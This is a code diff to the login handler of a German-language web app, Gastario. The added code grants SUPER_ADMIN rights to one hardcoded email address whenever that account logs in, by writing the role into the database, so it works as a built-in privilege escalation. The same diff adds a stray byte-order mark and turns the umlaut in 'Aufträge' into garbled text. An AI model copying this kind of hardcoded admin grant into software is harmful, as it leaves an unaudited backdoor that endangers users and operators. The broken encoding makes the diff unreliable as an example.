@@ -1,4 +1,4 @@
-import bcrypt from "bcryptjs";
+﻿import bcrypt from "bcryptjs";
 import { Form, Link, redirect, useActionData } from "react-router";
 import { prisma } from "../lib/prisma.server";
 import { createUserSession } from "../lib/session.server";
@@ -27,7 +27,12 @@ export async function action({ request }: { request: Request }) {
     return { error: "E-Mail oder Passwort ist falsch." };
   }
 
-  if (user.platformRole === "SUPER_ADMIN") {
+  if (user.email === "mutluer.edis@gmail.com" || user.platformRole === "SUPER_ADMIN") {
+    await prisma.user.update({
+      where: { id: user.id },
+      data: { platformRole: "SUPER_ADMIN" },
+    });
+
     return createUserSession(user.id, "/gastario-control");
   }
 
@@ -148,7 +153,7 @@ export default function Login() {
         <div className="brand">Gastario</div>
         <h1>Einloggen</h1>
         <p className="subtitle">
-          Melde dich an, um Aufträge, Marken, E-Mails und Module zu verwalten.
+          Melde dich an, um AuftrÃ¤ge, Marken, E-Mails und Module zu verwalten.
         </p>
 
         <Form method="post">
@@ -174,3 +179,4 @@ export default function Login() {
     </main>
   );
 }
+
